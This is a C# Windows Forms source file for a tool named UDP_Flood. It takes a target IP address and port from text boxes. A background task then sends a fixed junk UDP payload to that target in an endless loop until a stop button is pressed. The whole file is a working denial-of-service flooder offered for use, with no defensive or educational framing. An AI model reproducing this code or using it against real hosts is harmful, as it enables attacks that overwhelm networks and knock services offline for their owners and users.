using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UDP_Flood
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        BackgroundWorker mybw1;
        public bool stop = false;
        
        

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            stop = false;
            try
            {

                string ipaddress = textBox1.Text;
                int port = (Convert.ToInt32(textBox2.Text));
                

                //Console.WriteLine(ipaddress);
                //Console.WriteLine(port);
                //Console.WriteLine(pass);
  

                mybw1 = new BackgroundWorker();
                mybw1.DoWork += (obj, ea) => TaskAsync1(ipaddress,port);
                mybw1.RunWorkerAsync();
                label3.Text = "Started !";
            }
            catch (Exception exx)
            {
                MessageBox.Show(exx.ToString());
            }
        }

        public async void TaskAsync1(string ip , int port)
        {
            try
            {
                UdpClient udpClient = new UdpClient();
                udpClient.Connect(ip, port);
                Byte[] sendBytes = Encoding.ASCII.GetBytes("sdkfhhhhhhhhhhhhsduifhosdhDFHBDFGVHFDHFGDHFGrfioshfdsiujfhtrjihbtguergtiwgedjfDXFDFSDFFFFFFFFFFFFFFFFFFFDSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSFSDTERGYEFDYHTDGHYFRERWSDFCHJUEWSDRXFUCTHJSEWDRXCUJTFHWSEDRXCUJSWEXRCDUJTSWEXRCUJrugi5847583495777777777777934444444444444444444444444444759375975555555555555555");
                
                //garbage payload :3

                while (stop == false)  //to stop
                {

                    udpClient.Send(sendBytes, sendBytes.Length);
                }
            }
            catch (Exception exxx)
            {
                MessageBox.Show(exxx.ToString());
            }

        }

        private void button2_Click(object sender, EventArgs e)
        {
            label3.Text = "Terminated !";
            stop = true;
        }
    }
}
